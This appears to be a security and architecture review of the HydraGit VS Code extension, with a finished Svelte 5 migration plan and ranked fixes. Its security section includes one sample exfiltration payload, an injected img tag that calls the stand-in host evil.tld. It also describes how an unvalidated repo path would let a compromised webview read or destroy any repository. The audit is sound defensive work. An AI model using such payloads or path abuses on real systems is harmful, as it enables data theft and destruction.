# FABLE.md — Repo Review Findings

> Architecture / stack / security review of HydraGit, 2026-06-09.
> Reviewed: `internal/git/repo.go`, `internal/ipc/handler.go`, `cmd/hydragit/main.go`,
> `extension/src/{goProcess,panel,RepoService}.ts`, `internal/git/log.go`,
> `docs/SECURITY.md`, `go.mod`, `package.json`.

**TL;DR:** Architecture is genuinely good and structurally enforced. Stack choices are
defensible (one honest caveat about the Go layer). Two real security gaps exist that are
**not** in `SECURITY.md` — unvalidated `msg.repo` is the one to fix before the next
release — plus one reliability bug that borders on DoS (64KB stdin scanner limit).

---

## Architecture

### What works

- **The layering is enforced structurally, not by convention.** `runCore`
  (`internal/git/repo.go:63`) is verifiably the only exec point; `handler.go` is the only
  dispatch; the webview holds zero git logic. The entire git surface is auditable by
  reading two files.
- **Parsing is done right.** `\x1f` (ASCII unit separator) field delimiter with explicit
  `--format` strings (`internal/git/log.go:20`) — unambiguous, no guessing at human-readable
  output.
- **The `ui.prompt` / `ui.confirm` seam** in `panel.ts` (native dialogs over the same
  id-based message bus) is a clean pattern that keeps dialog UI in the host.
- **Sensible operational details:** 30s `networkTimeout` on remote ops with a meaningful
  error message on expiry; `--force-with-lease` instead of `--force`; auto-stash before
  hard reset; pending-promise rejection when the Go process dies (`goProcess.ts:63`).

### Issues

1. **The Go IPC loop is fully serial.** `main.go:47` calls `ipc.Handle` synchronously
   inside the stdin scan loop. One slow command blocks everything behind it — a `fetch`
   against a dead remote holds the line for the full 30s timeout, freezing the 3s status
   poll, the sidebar, and every panel. Multi-repo makes it worse: repo B is blocked by
   repo A's network op for no reason.
   *Fix shape:* per-request goroutines with a per-repo-path mutex — git ops on one repo
   should stay serialized (concurrent mutations on the same `.git` risk index/lock
   corruption), but independent repos and read-only ops needn't queue behind a fetch.

2. **`lastStatusHash` is a single global** (`handler.go:43`). In a multi-repo workspace,
   two repos' status payloads ping-pong the hash and re-log "status changed" forever.
   Should be keyed by repo path.

3. **Two stray git exec points in TypeScript** violate the spirit of the one-`run()` rule:
   `fileExistsAtRef` (`panel.ts:30`) and `openCommitUrl` (`panel.ts:116`) call
   `execFile('git', ...)` directly — no logging, no timeout. `openCommitUrl` reading
   config is harmless, but it's the same hang class already fixed in Go (BUGS.md #5).

---

## Stack

- **Zero runtime npm dependencies and zero production Go dependencies** (go.mod is all
  test tooling). Excellent supply-chain posture for a Marketplace extension — genuinely rare.
- **The Go binary is the debatable choice.** What it buys: a great test story (real
  temp-repo tests are far nicer in Go than Node), fast parsing of huge logs, a hard wall
  keeping git logic out of TS. What it costs: 4-platform binary distribution, the still-open
  macOS signing/notarization item, process lifecycle/crash handling, and the whole IPC
  layer — all wrapping the same git CLI that `child_process.execFile` could call from the
  host. The cost is already paid and the test suite is the payoff — don't unwind it, but
  resist letting the Go side grow features that don't need it.
- **Svelte: already on the v5 compiler, components still in v4 syntax.** `svelte@5.55.0`
  is installed and the toolchain builds with it; the 17 components are written in legacy
  syntax (`export let` in 17 files, `$:` in 15) running under Svelte 5's compatibility
  mode. The risky half of the migration (toolchain) is already done — what remains is a
  mechanical syntax modernization. See the migration plan below. (CLAUDE.md's "Svelte 4
  webview" line is stale.)
- Nit: `activationEvents` lists `"onStartupFinished"` twice in `package.json`.

---

## Svelte 5 migration plan

**✅ DONE 2026-06-09.** All 20 components migrated to runes via `svelte/compiler`
`migrate()` + a manual pass that eliminated every `svelte/legacy` crutch the codemod
left (8 files had `run()`/`createBubbler`/`stopPropagation`/`preventDefault` shims).
Notable manual decisions: BranchPane's open-state caches reverted to plain lets (the
codemod made them `$state`, creating a read+write self-retrigger risk inside the tree
effects, now `$effect.pre` to compute before paint); `App.repoName` became `$derived`;
`SideBySideDiff.diffCount` stayed an effect (it's a `$bindable` pushed to the parent);
dead `bubble()` forwarders removed (no parent listened). All 20 compile clean in runes
mode. Verification (user runs): `make webview-check`, `npm run test`, Playwright e2e.

Original plan, for reference:

**Status (verified 2026-06-09):** the compiler is already Svelte 5 (`5.55.0` installed,
Vite toolchain builds with it). All 17 `.svelte` components are written in legacy v4
syntax and run under Svelte 5's compatibility mode. Zero uses of
`createEventDispatcher` — the most painful deprecated pattern is absent. This is a
**syntax modernization, not a framework upgrade**; the risky toolchain half is done.

Scope of legacy syntax: `export let` props in 17 files, `$:` reactive statements in 15
files, `webview/src/panels/sidebar/shared/repoStore.ts` uses `writable` stores (still
fully supported in runes mode — optional to convert).

### Steps

1. **Codemod:** `npx sv migrate svelte-5` over `webview/src` — mechanically converts
   `export let` → `$props()`, most `$:` → `$derived`, `on:click` → `onclick`.
2. **Manual pass:** `$:` statements with side effects become `$effect(...)` (the codemod
   flags ambiguous ones rather than guessing); review each.
3. **Stores:** leave `repoStore.ts` as `writable` for now — valid in runes mode; convert
   to `$state`-based modules later only if it pays for itself.
4. **Verify (user runs):** `make webview-check` (svelte-check), `npm run test` (Vitest —
   the emit/prop component tests are the regression net), Playwright e2e.
5. **Docs:** update CLAUDE.md stack line ("Svelte 4 webview" → Svelte 5).

### Timing & risk

- **Do it after the first Marketplace release** — it produces a pixel-identical UI and
  shouldn't gate launch.
- Risk is low: small component count, compat mode allows converting one component at a
  time, and the Vitest suite covers exactly the surface that changes (props/emits).
- Showcase angle: "migrated the UI layer across a major framework rewrite with zero
  regressions, proven by my own test suite" — better LinkedIn material than the
  migration itself.

---

## Security

`docs/SECURITY.md` is honest and its threat-model scoping is correct. These findings are
ranked; **#1–#4 are not in SECURITY.md.**

### 1. `msg.repo` is unvalidated — arbitrary-path git execution ⚠️ fix first

`RepoService.setActive` validates against known repos, but the per-request stamp bypasses
it entirely: the webview sends `msg.repo`, `panel.ts:345` (and the sidebar handler at
`panel.ts:508`) forward it verbatim to `goProcess.send`, and `handler.go:80` overrides
`repoPath` with it. A compromised webview — or a plain bug — can run **any command against
any directory on disk**: `log`/`diff` to read a private repo elsewhere under `$HOME` and
render it, or `reset --hard` / `stash.clear` / `branch.delete -D` to destroy one.

This upgrades a webview XSS from "messes up my panel" to "reads/destroys anything
git-shaped on the machine."

*Fix:* in both `onDidReceiveMessage` handlers, reject `msg.repo` unless it is in
`RepoService.getRepos()`. This single check also substantially mitigates the still-open
command-allowlist item in SECURITY.md.

### 2. `bufio.Scanner` 64KB token limit kills the IPC loop ⚠️ reliability + DoS

`main.go:46` uses a default `bufio.Scanner` on stdin — max token 64KB. Buffer-aware blame
sends the entire editor buffer in `params.contents`; blaming any file over ~64KB makes the
scanner fail with "token too long", the loop exits, and the whole backend dies — taking
every pending promise with it.

*Fix (one line):* `scanner.Buffer(make([]byte, 0, 64*1024), 16*1024*1024)`.

### 3. `worktree.open` accepts an arbitrary path

`panel.ts:296` passes `msg.params.path` straight to `vscode.openFolder` with
`forceNewWindow`. Opening an attacker-chosen folder is a workspace-trust escalation vector
(that folder's `.vscode` config gets a foothold).

*Fix:* validate the path against the last `worktree.list` result before opening.

### 4. `img-src https:` is a quiet exfiltration channel

With `default-src 'none'` blocking fetch, the blanket avatar allowance (`panel.ts:406`) is
the only network egress left in the main panel: an injected
`<img src="https://evil.tld/?d=branchnames">` exfiltrates via query string.

*Fix:* scope `img-src` to the actual avatar hosts (Gravatar/GitHub) instead of all of `https:`.

### 5. Already-documented open items — suggested priority order

1. **Sidebar CSP** — `HydraSidebarProvider.getHtml()` (`panel.ts:558`) injects no CSP at
   all, while the main panel and `historyPanel.ts:147` both have one. One-liner.
2. **`HYDRAGIT_REPO` validation at startup** (`main.go:21` defaults to `"."` with no
   `rev-parse --git-dir` check).
3. **`force`-from-webview confirmation gating** — matters most *after* #1 is fixed, since
   `msg.repo` is currently the bigger hole in the same trust boundary. Note the
   `ui.confirm` flow is advisory: the host shows the dialog but nothing binds the answer
   to the destructive send that follows. Real enforcement = host gates `force`/destructive
   cmds on its own recorded confirmation state.
4. Empty-param rejection in `handler.go` (cosmetic — git errors anyway, just noisily).

---

## Suggested immediate fixes (small, no feature-behavior change)

| # | Fix | Where | Size |
|---|---|---|---|
| 1 | Allowlist `msg.repo` against `RepoService.getRepos()` | `panel.ts` both handlers | ~10 lines |
| 2 | Raise scanner buffer to 16MB | `main.go` | 1 line |
| 3 | Validate `worktree.open` path against `worktree.list` | `panel.ts` | ~10 lines |
| 4 | Add CSP meta to sidebar HTML | `panel.ts` `HydraSidebarProvider.getHtml()` | ~10 lines |
